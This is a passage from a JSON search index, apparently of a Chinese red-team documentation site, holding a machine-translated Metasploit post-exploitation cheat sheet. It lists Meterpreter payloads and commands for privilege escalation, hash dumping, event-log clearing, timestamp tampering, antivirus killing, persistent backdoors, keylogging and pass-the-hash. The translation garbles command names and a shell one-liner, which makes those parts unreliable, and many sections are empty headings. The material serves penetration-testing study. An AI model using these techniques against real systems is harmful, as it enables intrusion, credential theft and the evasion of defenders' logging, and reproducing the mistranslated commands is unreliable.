\u6709\u6548\u8d1f\u8f7d\u53d1\u9001\u5230\u4ed6\u4eec\u5177\u6709\u7ba1\u7406\u8bbf\u95ee\u6743\u9650\u7684\u53e6\u4e00\u4e2a\u76d2\u5b50\u4e0a\u3002\u8fd9\u662f\u6700\u540e\u4e00\u4e2a\u9636\u6bb5\uff0c\u56e0\u4e3a\u5728\u521d\u59cb\u8bbf\u95ee\u7684\u80be\u4e0a\u817a\u7d20\u9ad8\u6da8\u65f6\u5f88\u96be\u96c6\u4e2d\u6ce8\u610f\u529b\u4e8e\u524d\u4e24\u4e2a\u9636\u6bb5\u3002 \u8363\u8a89\u5956\uff08\u795e\u79d8\u7684\u7b2c 4 \u4e2a\"P\"\uff09\u7279\u6743\u5347\u7ea7\u4e0d\u662f\u4e09\u91cd\u594f\u7684\u4e00\u90e8\u5206\uff08\u56e0\u4e3a\u90a3\u65f6\u4f1a\u6709 4 \u4e2a\uff0c\u6211\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u79f0\u547c\u5b83\uff09\u867d\u7136\u5b83\u662f\u653b\u51fb\u8005\u6267\u884c\u7684\u5e38\u89c4\u6b65\u9aa4\uff0c\u4f46\u5b83\u901a\u5e38\u4f1a\u5f97\u5230\u8fc7\u5206\u5f3a\u8c03\u3002 _\u60a8\u5e76\u4e0d\u603b\u662f\u9700\u8981\u57df\u7ba1\u7406\u5458\u8bbf\u95ee\u6743\u9650\u624d\u80fd\u8bbf\u95ee\"\u7687\u51a0\u4e0a\u7684\u73e0\u5b9d\"_\u3002\u5e94\u8be5\u5047\u8bbe\u8fd9\u4e9b\u5177\u6709\u9ad8\u5ea6\u7279\u6743\u7684\u5e10\u6237\u53d7\u5230\u9ad8\u5ea6\u76d1\u63a7\u548c\u89ca\u89ce\u3002 \uff08\u5c06\u65b0\u7528\u6237\u6dfb\u52a0\u5230 Domain Admins \u7ec4\u5c31\u50cf\u70b9\u71c3\u4f60\u7684\u5934\u53d1\u5e76\u5728\u76ee\u6807\u529e\u516c\u5927\u697c\u7684\u524d\u95e8\u5c16\u53eb\"h4x!!\"\uff09 Windows \u539f\u751f Meterpreter \u00b6 \u53ef\u7528\u6709\u6548\u8f7d\u8377\uff1a windows/meterpreter/bind_ipv6_tcp windows/meterpreter/bind_nonx_tcp windows/meterpreter/bind_tcp windows/meterpreter/find_tag windows/meterpreter/reverse_http windows/meterpreter/reverse_https windows/meterpreter/reverse_ipv6_http windows/meterpreter/reverse_ipv6_https windows/meterpreter/reverse_ipv6_tcp windows/meterpreter/reverse_nonx_tcp windows/meterpreter/reverse_ord_tcp windows/meterpreter/reverse_tcp windows/meterpreter/reverse_tcp_allports windows/meterpreter/reverse_tcp_dns windows/patchupmeterpreter/bind_ipv6_tcp windows/patchupmeterpreter/bind_nonx_tcp windows/patchupmeterpreter/bind_tcp windows/patchupmeterpreter/find_tag windows/patchupmeterpreter/reverse_ipv6_tcp windows/patchupmeterpreter/reverse_nonx_tcp windows/patchupmeterpreter/reverse_ord_tcp windows/patchupmeterpreter/reverse_tcp windows/patchupmeterpreter/reverse_tcp_allports windows/patchupmeterpreter/reverse_tcp_dns windows/x64/meterpreter/bind_tcp windows/x64/meterpreter/reverse_tcp Windows Meterpreter \u662f Metasploit \u4e2d\u6700\u6210\u719f\u548c\u77e5\u540d\u7684\u6709\u6548\u8d1f\u8f7d\u96c6\uff0c\u800c\u5176\u4ed6\u90e8\u5206\u5c06\u5c1d\u8bd5\u7a81\u7834\u4e0d\u540c Meterpreter \u7c7b\u578b\u7684\u529f\u80fd\u9650\u5236\uff0c\u672c\u90e8\u5206\u5c06\u66f4\u591a\u5730\u5173\u6ce8\u4f7f\u7528\u5b83\u7684\"\u6700\u4f73\"\u65b9\u5f0f\u3002\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a\u53ef\u516c\u5f00\u7f16\u8f91\u7684\u9875\u9762\uff0c\u8fd9\u610f\u5473\u7740\"\u6700\u597d\"\u4f1a\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u800c\u53d1\u5c55\uff0c\u4f46\u5982\u679c\u4f60\u653e\u5165\u4e00\u4e9b\u6211\u8ba4\u4e3a\u5f88\u611a\u8822\u7684\u4e1c\u897f\uff0c\u4f1a\u5bfc\u81f4\u653b\u51fb\u8005\u88ab\u6293\u4f4f\uff0c\u6216\u8005\u5f88\u96be/\u4e0d\u53ef\u80fd\u6e05\u7406\u3002 [--mubix] \u5728\u573a \u00b6 \u6301\u4e45\u6027 \u00b6 \u65cb\u8f6c \u00b6 Java Meterpreter \u00b6 \u53ef\u7528\u6709\u6548\u8f7d\u8377\uff1a java/meterpreter/bind_tcp java/meterpreter/reverse_http java/meterpreter/reverse_https java/meterpreter/reverse_tcp \u5728\u573a \u00b6 \u6301\u4e45\u6027 \u00b6 \u65cb\u8f6c \u00b6 \u00b6 \u00b6 Linux \u4e0a\u7684 PHP Meterpreter \u00b6 \u53ef\u7528\u6709\u6548\u8f7d\u8377\uff1a php/meterpreter/bind_tcp php/meterpreter/reverse_tcp php/meterpreter_reverse_tcp \u5728\u573a \u00b6 \u6301\u4e45\u6027 \u00b6 \u65cb\u8f6c \u00b6 \u00b6 \u00b6 Windows \u4e0a\u7684 PHP Meterpreter \u00b6 \u53ef\u7528\u6709\u6548\u8f7d\u8377\uff1a php/meterpreter/bind_tcp php/meterpreter/reverse_tcp php/meterpreter_reverse_tcp \u5728\u573a \u00b6 \u6301\u4e45\u6027 \u00b6 \u65cb\u8f6c \u00b6 Linux Meterpreter \u00b6 \u53ef\u7528\u6709\u6548\u8f7d\u8377\uff1a linux/x86/meterpreter/bind_ipv6_tcp linux/x86/meterpreter/bind_tcp linux/x86/meterpreter/find_tag linux/x86/meterpreter/reverse_ipv6_tcp linux/x86/meterpreter/reverse_tcp \u5728\u573a \u00b6 \u6301\u4e45\u6027 \u00b6 \u65cb\u8f6c \u00b6 \u5217\u51fa\u4e86\u6bcf\u4e2a\u547d\u4ee4\u7684\u517c\u5bb9\u6027\uff0c\u8fd9\u91cc\u662f\u7f29\u5199\u7684\u5173\u952e\uff1a Windows Meterpreter \u8d62 Java Meterpreter \u722a\u54c7 PHP Meterpreter php Linux Meterpreter linux \u547d\u4ee4\u5916\u58f3 \u8d1d\u58f3 Metasploit 4.2 \u6587\u6863\uff1a https://community.rapid7.com/docs/DOC-1751 \u4fe1\u606f\u6536\u96c6 \u00b6 \u547d\u4ee4 \u517c\u5bb9\u6027 \u63cf\u8ff0\u548c\u539f\u56e0 getuid \u8d62\uff0cJava\uff0cPHP \u5217\u51fa\u5f53\u524d\u7528\u6237 Meterpreter \u811a\u672c \u00b6 \uff08\u5df2\u5f03\u7528\u4f46\u4ecd\u7136\u6709\u7528\uff09 \u53d1\u5e03\u6a21\u5757 \u00b6 \u53d6\u81ea WINDOWS \u5217\u8868\uff0c\u9700\u8981\u683c\u5f0f\u5316 \u00b6 Meterpreter \u547d\u4ee4 ps \uff08\u663e\u793a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u53ca\u5176\u5173\u8054\u7684\u7528\u6237/ID \u53f7\uff09 getuid \u83b7\u53d6\u7528\u6237 ID \u83b7\u53d6pid \u83b7\u53d6\u8fdb\u7a0b ID \u83b7\u53d6\u6743\u9650 \uff08\u663e\u793a\u5f53\u524d\u6743\u9650\uff09 \u83b7\u53d6\u7cfb\u7edf \u5c1d\u8bd5\u4f7f\u7528 4 \u79cd\u65b9\u6cd5\u83b7\u53d6 SYSTEM\uff0c\u6700\u540e\u4e00\u79cd\u662f\u540d\u4e3aKitrap0d \u7684\u672c\u5730\u6f0f\u6d1e\u5229\u7528\u3002\u8fd9\u6709\u65f6\u4f1a\u88ab\u57fa\u4e8e\u4e3b\u673a\u7684 IDS \u7cfb\u7edf\u6355\u83b7\uff0c\u751a\u81f3\u5728\u6781\u5c11\u6570\u60c5\u51b5\u4e0b\u4f1a\u84dd\u5c4f\u673a\u5668\u3002 getsystem -\uff08\u76ee\u6807 getsys \u7684\u5360\u4f4d\u7b26\uff09 \u5982\u679c\u6709\u4eba\u60f3\u5728\u6211\u80fd\u505a\u5230\u4e4b\u524d\u586b\u5199\u8fd9\u4e2a \u7cfb\u7edf\u4fe1\u606f \u83b7\u53d6\u7cfb\u7edf\u4fe1\u606f \u65f6\u95f4\u6233 \u5982\u679c\u60a8\u8db3\u591f\u597d\uff0c\u8bf7\u5220\u9664/\u641e\u7838\u65f6\u95f4\u6233\uff0c\u8fd9\u4f1a\u5f04\u4e71\u5ba1\u8ba1\u5de5\u5177 \u514b\u5229\u8036\u592b \u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7 \u54c8\u5e0c\u8f6c\u50a8 \u8f6c\u50a8 SAM \u6587\u4ef6\u54c8\u5e0c\u4ee5\u4f20\u9012\u54c8\u5e0c\u6216\u7834\u89e3 \u8fc1\u79fb [pid] \u4ece\u88ab\u5229\u7528\u7684\u8fdb\u7a0b\u8f6c\u79fb\u5230\u53e6\u4e00\u4e2a\u8fdb\u7a0b \u6709\u7528\u7684 Meterpreter \u811a\u672c killav.rb\uff08\u6740\u6b7b\u6240\u6709\u9632\u75c5\u6bd2\u8fdb\u7a0b\u7684 Meterpreter \u811a\u672c\u3002\uff09 winenum.rb\uff08\u68c0\u7d22\u6709\u5173\u7cfb\u7edf\u7684\u5404\u79cd\u4fe1\u606f\uff0c\u5305\u62ec\u73af\u5883\u53d8\u91cf\u3001interfanetworkces\u3001print_line\"\u8def\u7531\u3001\u7528\u6237\u5e10\u6237\u7b49\u7b49\u3002\uff09 scraper.rb\uff08\u6536\u96c6\u7cfb\u7edf\u4fe1\u606f\uff0c\u5305\u62ec\u7f51\u7edc\u5171\u4eab\u3001\u6ce8\u518c\u8868\u914d\u7f6e\u5355\u5143\u548c\u5bc6\u7801\u54c8\u5e0c\u3002\uff09 persistence.rb\uff08\u7528\u4e8e\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u521b\u5efa\u6301\u4e45\u540e\u95e8\u7684 Meterpreter \u811a\u672c\u3002\uff09 keylogrecorder.rb\uff08\u6b64\u811a\u672c\u5c06\u542f\u52a8 Meterpreter \u952e\u76d8\u8bb0\u5f55\u5668\u5e76\u4fdd\u5b58\u6240\u6709\u952e\u3002\uff09 getgui.rb\uff08Windows \u8fdc\u7a0b\u684c\u9762\u542f\u52a8\u5668 Meterpreter \u811a\u672c\u3002\uff09 \u5982\u9700\u5b8c\u6574\u5217\u8868\uff0c\u8bf7\u53c2\u9605\uff1a http://metasploit.com/svn/framework3/trunk/scripts/meterpreter/ \u6709\u7528\u7684 Meterpreter \u5e16\u5b50\u6a21\u5757 \u00b6 \u53d1\u5e03/Windows/\u6536\u96c6/smart_hashdump \u53d1\u5e03/Windows/\u6536\u96c6/\u51ed\u636e/vnc post/windows/escalate/bypassuac\uff08\u6df7\u5408\u7ed3\u679c\uff09 \u6709\u7528\u7684\u591a\u6b65\u9aa4\u6280\u672f \u00b6 \"Pass The Hash\" \u653b\u51fb\uff08\u901a\u8fc7\u7a83\u53d6\u7684\u54c8\u5e0c\u8bbf\u95ee\u5176\u4ed6\u8ba1\u7b97\u673a\uff0c\u4e0d\u6d89\u53ca\u7834\u89e3\uff09 \u901a\u8fc7\u9690\u8eab\u65b9\u5f0f\u6a21\u62df\u4ee4\u724c \u4f7f\u7528\u9690\u8eab list_tokens -u impersonate_token -> http://www.offensive-security.com/metasploit-unleashed/Fun_With_Incognito # \u5c06 Metasploit \u7684 MSCACHE \u8f93\u51fa\u8f6c\u6362\u4e3a Hashcat \u7248\u672c\uff08\u5728 ~/.msf4/loot/ \u4e2d\u6267\u884c\uff09\uff1a \u732b *mscache* | awk -F \\'\\\"\\' \\'{\u6253\u5370 $4\\\":\\\"$2}\\'","title":"\u540e\u6e17\u900f"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#metasploit","text":"\u76ee\u5f55 Windows \u539f\u751f Meterpreter \u5728\u573a \u6301\u4e45\u6027 \u65cb\u8f6c Java Meterpreter \u5728\u573a \u6301\u4e45\u6027 \u65cb\u8f6c Linux \u4e0a\u7684 PHP Meterpreter \u5728\u573a \u6301\u4e45\u6027 \u65cb\u8f6c Windows \u4e0a\u7684 PHP Meterpreter \u5728\u573a \u6301\u4e45\u6027 \u65cb\u8f6c Linux Meterpreter \u5728\u573a \u6301\u4e45\u6027 \u65cb\u8f6c \u4fe1\u606f\u6536\u96c6 Meterpreter \u811a\u672c \u53d1\u5e03\u6a21\u5757 \u53d6\u81ea WINDOWS \u5217\u8868\uff0c\u9700\u8981\u683c\u5f0f\u5316 \u6709\u7528\u7684 Meterpreter \u5e16\u5b50\u6a21\u5757 \u6709\u7528\u7684\u591a\u6b65\u9aa4\u6280\u672f","title":"Metasploit \u540e\u5229\u7528\u547d\u4ee4\u5217\u8868"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_1","text":"\u6bcf\u4e2a\u4eba\u505a\u4e8b\u7684\u65b9\u5f0f\u90fd\u4e0d\u4e00\u6837\uff0c\u89e3\u91ca\u653b\u51fb\u8005\u5728\u83b7\u5f97 shell \u65f6\u4f1a\u7ecf\u5386\u4ec0\u4e48\u51e0\u4e4e\u662f\u4e0d\u53ef\u80fd\u7684\uff0c\u751a\u81f3\u66f4\u4e0d\u80fd\u6982\u62ec\u4e3a\u4e00\u79cd\u65b9\u6cd5\u8bba\uff0c\u4f46\u6211\u5df2\u7ecf\u5c1d\u8bd5\u901a\u8fc7\"3\\'P\\'s of Post Exploitation\"\u548c\u51fa\u4e8e\u67d0\u79cd\u539f\u56e0\uff0c\u5b83\u4eec\u5904\u4e8e\u7279\u5b9a\u987a\u5e8f\uff0c\u4f46\u80af\u5b9a\u53d6\u51b3\u4e8e\u6700\u4f73\u987a\u5e8f\u3002 \u7b2c\u4e00\u4e2a P \u662f\u5b58\u5728\u3002\u9996\u5148\u662f\u56e0\u4e3a\u653b\u51fb\u8005\u9700\u8981\u5728\u4ed6\u4eec\u7ee7\u7eed\u524d\u8fdb\u4e4b\u524d\u4e86\u89e3\u4ed6/\u5979\u5f97\u5230\u4e86\u4ec0\u4e48\u3002\u5b83\u5728\u5176\u4ed6\u4e24\u4e2a\"P\"\u4e2d\u8d77\u7740\u81f3\u5173\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u4f7f\u5b83\u4eec\u66f4\u9690\u853d\u6216\u66f4\u5bb9\u6613\u3002\u5f88\u591a\u6b21\u6211\u770b\u5230\u4eba\u4eec\u4ece\u4e00\u4e2a\u76d2\u5b50\u8df3\u5230\u53e6\u4e00\u4e2a\u76d2\u5b50\uff0c\u5b8c\u5168\u9519\u8fc7\u4e86\u4ed6\u4eec\u6b63\u5728\u5bfb\u627e\u7684\u7b2c\u4e00\u4e2a\u76d2\u5b50\u3002\u6240\u4ee5\"\u5b58\u5728\"\u5c31\u662f\u8981\u53d1\u73b0\u4f60\uff08\u653b\u51fb\u8005\uff09\u5df2\u7ecf\u62e5\u6709\u7684\u4e1c\u897f\u3002\u8fd9\u6709\u5f88\u591a\u7ea7\u522b\uff0c\u653b\u51fb\u8005\u68c0\u67e5\u5b83\u4eec\u7684\u987a\u5e8f\u548c\u65b9\u5f0f\u4e5f\u662f\u4efb\u610f\u7684\uff0c\u4f46\u5b83\u4eec\u81f3\u5c11\u5e94\u8be5\u6709\u4e00\u4e2a\u8981\u68c0\u67e5\u7684\u7c7b\u522b\u68c0\u67e5\u5217\u8868\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u9700\u8981\u8003\u8651\u7684\u95ee\u9898\uff1a \u6587\u4ef6\u7cfb\u7edf\uff1a \u77e5\u9053\"\u5728\u54ea\u91cc\"\u67e5\u627e\u662f\u5f88\u56f0\u96be\u7684\uff0c\u4f46\u5728\u4e0b\u9762\u7684\u6bcf\u4e2a\u90e8\u5206\u4e2d\uff0c\u6211\u4eec\u5c06\u8fdb\u5165\u5df2\u77e5\u7684\u597d\u5730\u65b9\u8fdb\u884c\u68c0\u67e5\u4ee5\u53ca\u641c\u7d22\u5177\u6709\u6709\u8da3\u540d\u79f0\u548c\u6269\u5c55\u540d\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684\u65b9\u6cd5 \u64cd\u4f5c\u7cfb\u7edf \u4ee3\u7406\u8bbe\u7f6e\u3001\u7ec4\u7b56\u7565\u8bbe\u7f6e\u3001\u767b\u5f55\u811a\u672c\u3001MOTD\u3001\u7528\u6237\u5217\u8868\uff08\u7f51\u7edc\u7528\u6237\u548c /etc/passwd\uff09\u3002\u4e86\u89e3\u7cfb\u7edf\u548c\u653b\u51fb\u8005\u662f\u5982\u4f55\u53d7\u5230\u653b\u51fb\u7684\uff0c\u5bf9\u4e8e\u7406\u89e3\u5b83\u5982\u4f55\u4f5c\u4e3a\u7f51\u7edc\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u901a\u4fe1\u548c\u5de5\u4f5c\u81f3\u5173\u91cd\u8981\u3002 \u5185\u5b58 \u4e3b\u8981\u4ee5\u4ece\u4e2d\u63d0\u53d6\u54c8\u5e0c\u548c\u51ed\u636e\u800c\u95fb\u540d\uff0c\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u6709\u8da3\u7684\u4e1c\u897f\u4ec5\u9a7b\u7559\u5728\u5185\u5b58\u4e2d \u5a92\u4f53 CD\u3001DVD\u3001NFS \u6302\u8f7d\u3001SMB \u6302\u8f7d\u3001USB \u8bb0\u5fc6\u68d2\u3002\u8fd9\u4e9b\u901a\u5e38\u5728\u653b\u51fb\u671f\u95f4\u88ab\u7ed5\u8fc7\u548c\u9057\u5fd8\uff0c\u4f46\u53ef\u4ee5\u638c\u63e1\u738b\u56fd\u7684\u94a5\u5319 \u7f51\u7edc \u8def\u7531\u3001ARP \u6761\u76ee\u3001netstat \u5f88\u5bb9\u6613\u68c0\u67e5\uff0c\u4f46\u5e7f\u64ad\u6d88\u606f\u3001\u4fa6\u542c\u5668\u548c IPv6 \u4e0d\u592a\u5e38\u89c1\u3002 \u6743\u9650\u548c\u51ed\u636e \u8fd9\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u4f46\u901a\u5e38\u6709\u5927\u91cf\u6570\u636e\uff0c\u56e0\u4e3a\u5373\u4f7f TinyCore linux \u4e5f\u6709\u6570\u767e\u4e2a\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u90fd\u6709\u81ea\u5df1\u7684\u6743\u9650\u3002\u6b64\u7c7b\u522b\u8d85\u51fa\u4e86\u5176\u4ed6\u7c7b\u522b\u7684\u8fb9\u754c\uff0c\u4f46\u91cd\u8981\u7684\u662f\u4f5c\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\u6b65\u9aa4\u5355\u72ec\u5217\u51fa\u3002 \u6301\u4e45\u6027\u662f\u5728\u4e0d\u540c\u7ea7\u522b\u4e0a\u5b9e\u73b0\u7684\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u653b\u51fb\u8005\u8bd5\u56fe\u751f\u5b58\u7684\u5185\u5bb9\u4ee5\u53ca\u653b\u51fb\u8005\u5728\u9690\u8eab\u65b9\u9762\u613f\u610f\u653e\u5f03\u7684\u5185\u5bb9\u3002\u4f8b\u5982\uff0c\u7559\u5728\u5185\u5b58\u4e2d\u51e0\u4e4e\u53ef\u4ee5\u6740\u6b7b\u653b\u51fb\u8005\u5728\u91cd\u65b0\u542f\u52a8\u540e\u5e78\u5b58\u7684\u673a\u4f1a\u3002\u5728\u91cd\u5efa\u6216\u6062\u590d\u4e2d\u751f\u5b58\u7684\u7b56\u7565\u4e5f\u975e\u5e38\u4e0d\u540c\u3002\u6301\u4e45\u6027\u4e5f\u53ef\u4ee5\u4ee5\u7b80\u5355\u8eab\u4efd\u9a8c\u8bc1\u7684\u5f62\u5f0f\u51fa\u73b0\uff0c\u5982\u679c\u653b\u51fb\u8005\u6709\u5bc6\u7801\u5e76\u4e14\u5b83\u53ef\u4ee5\u8ba9\u4ed6/\u5979\u7684\u4ee3\u7801\u6267\u884c\u6216\u8bbf\u95ee\u4ed6\u4eec\u4e4b\u540e\u7684\u6570\u636e\uff0c\u90a3\u4e48\u8fd9\u5c31\u662f\u4ed6\u4eec\u6240\u9700\u8981\u7684\u4e00\u5207\u3002\u5e94\u7279\u522b\u5173\u6ce8\u6e17\u900f\u6d4b\u8bd5\u7684\u4fe1\u606f\u6536\u96c6\u90e8\u5206\u6216\u4e0e\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1\u7684\u5730\u65b9\u6709\u5173\u7684\u7ea2\u961f\u53c2\u4e0e\u3002 Pivoting simple \u610f\u5473\u7740\u6269\u5c55\u653b\u51fb\u8005\u5f53\u524d\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u5e76\u4e14\u53ef\u80fd\u610f\u5473\u7740\u4ece\u8fde\u63a5\u5230\u8fdc\u7a0b NFS \u6302\u8f7d\u5230\u653b\u51fb\u8005 PSEXEC \u5c06\u4ed6\u4eec\u7684 Meterpreter \u6709\u6548\u8d1f\u8f7d\u53d1\u9001\u5230\u4ed6\u4eec\u5177\u6709\u7ba1\u7406\u8bbf\u95ee\u6743\u9650\u7684\u53e6\u4e00\u4e2a\u76d2\u5b50\u4e0a\u3002\u8fd9\u662f\u6700\u540e\u4e00\u4e2a\u9636\u6bb5\uff0c\u56e0\u4e3a\u5728\u521d\u59cb\u8bbf\u95ee\u7684\u80be\u4e0a\u817a\u7d20\u9ad8\u6da8\u65f6\u5f88\u96be\u96c6\u4e2d\u6ce8\u610f\u529b\u4e8e\u524d\u4e24\u4e2a\u9636\u6bb5\u3002 \u8363\u8a89\u5956\uff08\u795e\u79d8\u7684\u7b2c 4 \u4e2a\"P\"\uff09\u7279\u6743\u5347\u7ea7\u4e0d\u662f\u4e09\u91cd\u594f\u7684\u4e00\u90e8\u5206\uff08\u56e0\u4e3a\u90a3\u65f6\u4f1a\u6709 4 \u4e2a\uff0c\u6211\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u79f0\u547c\u5b83\uff09\u867d\u7136\u5b83\u662f\u653b\u51fb\u8005\u6267\u884c\u7684\u5e38\u89c4\u6b65\u9aa4\uff0c\u4f46\u5b83\u901a\u5e38\u4f1a\u5f97\u5230\u8fc7\u5206\u5f3a\u8c03\u3002 _\u60a8\u5e76\u4e0d\u603b\u662f\u9700\u8981\u57df\u7ba1\u7406\u5458\u8bbf\u95ee\u6743\u9650\u624d\u80fd\u8bbf\u95ee\"\u7687\u51a0\u4e0a\u7684\u73e0\u5b9d\"_\u3002\u5e94\u8be5\u5047\u8bbe\u8fd9\u4e9b\u5177\u6709\u9ad8\u5ea6\u7279\u6743\u7684\u5e10\u6237\u53d7\u5230\u9ad8\u5ea6\u76d1\u63a7\u548c\u89ca\u89ce\u3002 \uff08\u5c06\u65b0\u7528\u6237\u6dfb\u52a0\u5230 Domain Admins \u7ec4\u5c31\u50cf\u70b9\u71c3\u4f60\u7684\u5934\u53d1\u5e76\u5728\u76ee\u6807\u529e\u516c\u5927\u697c\u7684\u524d\u95e8\u5c16\u53eb\"h4x!!\"\uff09","title":"\u5b58\u5728\u3001\u6301\u4e45\u6027\u548c\u65cb\u8f6c"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#windows-meterpreter","text":"\u53ef\u7528\u6709\u6548\u8f7d\u8377\uff1a windows/meterpreter/bind_ipv6_tcp windows/meterpreter/bind_nonx_tcp windows/meterpreter/bind_tcp windows/meterpreter/find_tag windows/meterpreter/reverse_http windows/meterpreter/reverse_https windows/meterpreter/reverse_ipv6_http windows/meterpreter/reverse_ipv6_https windows/meterpreter/reverse_ipv6_tcp windows/meterpreter/reverse_nonx_tcp windows/meterpreter/reverse_ord_tcp windows/meterpreter/reverse_tcp windows/meterpreter/reverse_tcp_allports windows/meterpreter/reverse_tcp_dns windows/patchupmeterpreter/bind_ipv6_tcp windows/patchupmeterpreter/bind_nonx_tcp windows/patchupmeterpreter/bind_tcp windows/patchupmeterpreter/find_tag windows/patchupmeterpreter/reverse_ipv6_tcp windows/patchupmeterpreter/reverse_nonx_tcp windows/patchupmeterpreter/reverse_ord_tcp windows/patchupmeterpreter/reverse_tcp windows/patchupmeterpreter/reverse_tcp_allports windows/patchupmeterpreter/reverse_tcp_dns windows/x64/meterpreter/bind_tcp windows/x64/meterpreter/reverse_tcp Windows Meterpreter \u662f Metasploit \u4e2d\u6700\u6210\u719f\u548c\u77e5\u540d\u7684\u6709\u6548\u8d1f\u8f7d\u96c6\uff0c\u800c\u5176\u4ed6\u90e8\u5206\u5c06\u5c1d\u8bd5\u7a81\u7834\u4e0d\u540c Meterpreter \u7c7b\u578b\u7684\u529f\u80fd\u9650\u5236\uff0c\u672c\u90e8\u5206\u5c06\u66f4\u591a\u5730\u5173\u6ce8\u4f7f\u7528\u5b83\u7684\"\u6700\u4f73\"\u65b9\u5f0f\u3002\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a\u53ef\u516c\u5f00\u7f16\u8f91\u7684\u9875\u9762\uff0c\u8fd9\u610f\u5473\u7740\"\u6700\u597d\"\u4f1a\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u800c\u53d1\u5c55\uff0c\u4f46\u5982\u679c\u4f60\u653e\u5165\u4e00\u4e9b\u6211\u8ba4\u4e3a\u5f88\u611a\u8822\u7684\u4e1c\u897f\uff0c\u4f1a\u5bfc\u81f4\u653b\u51fb\u8005\u88ab\u6293\u4f4f\uff0c\u6216\u8005\u5f88\u96be/\u4e0d\u53ef\u80fd\u6e05\u7406\u3002 [--mubix]","title":"Windows \u539f\u751f Meterpreter"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_2","text":"","title":"\u5728\u573a"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_3","text":"","title":"\u6301\u4e45\u6027"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_4","text":"","title":"\u65cb\u8f6c"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#java-meterpreter","text":"\u53ef\u7528\u6709\u6548\u8f7d\u8377\uff1a java/meterpreter/bind_tcp java/meterpreter/reverse_http java/meterpreter/reverse_https java/meterpreter/reverse_tcp","title":"Java Meterpreter"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_5","text":"","title":"\u5728\u573a"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_6","text":"","title":"\u6301\u4e45\u6027"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_7","text":"","title":"\u65cb\u8f6c"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_8","text":"","title":""},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_9","text":"","title":""},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#linux-php-meterpreter","text":"\u53ef\u7528\u6709\u6548\u8f7d\u8377\uff1a php/meterpreter/bind_tcp php/meterpreter/reverse_tcp php/meterpreter_reverse_tcp","title":"Linux \u4e0a\u7684 PHP Meterpreter"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_10","text":"","title":"\u5728\u573a"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_11","text":"","title":"\u6301\u4e45\u6027"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_12","text":"","title":"\u65cb\u8f6c"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_13","text":"","title":""},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_14","text":"","title":""},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#windows-php-meterpreter","text":"\u53ef\u7528\u6709\u6548\u8f7d\u8377\uff1a php/meterpreter/bind_tcp php/meterpreter/reverse_tcp php/meterpreter_reverse_tcp","title":"Windows \u4e0a\u7684 PHP Meterpreter"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_15","text":"","title":"\u5728\u573a"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_16","text":"","title":"\u6301\u4e45\u6027"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_17","text":"","title":"\u65cb\u8f6c"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#linux-meterpreter","text":"\u53ef\u7528\u6709\u6548\u8f7d\u8377\uff1a linux/x86/meterpreter/bind_ipv6_tcp linux/x86/meterpreter/bind_tcp linux/x86/meterpreter/find_tag linux/x86/meterpreter/reverse_ipv6_tcp linux/x86/meterpreter/reverse_tcp","title":"Linux Meterpreter"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_18","text":"","title":"\u5728\u573a"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_19","text":"","title":"\u6301\u4e45\u6027"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_20","text":"\u5217\u51fa\u4e86\u6bcf\u4e2a\u547d\u4ee4\u7684\u517c\u5bb9\u6027\uff0c\u8fd9\u91cc\u662f\u7f29\u5199\u7684\u5173\u952e\uff1a Windows Meterpreter \u8d62 Java Meterpreter \u722a\u54c7 PHP Meterpreter php Linux Meterpreter linux \u547d\u4ee4\u5916\u58f3 \u8d1d\u58f3 Metasploit 4.2 \u6587\u6863\uff1a https://community.rapid7.com/docs/DOC-1751","title":"\u65cb\u8f6c"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/#_21","text":"\u547d\u4ee4 \u517c\u5bb9\u6027 \u63cf\u8ff0\u548c\u539f\u56e0 getuid \u8d62\uff0cJava\uff0cPHP 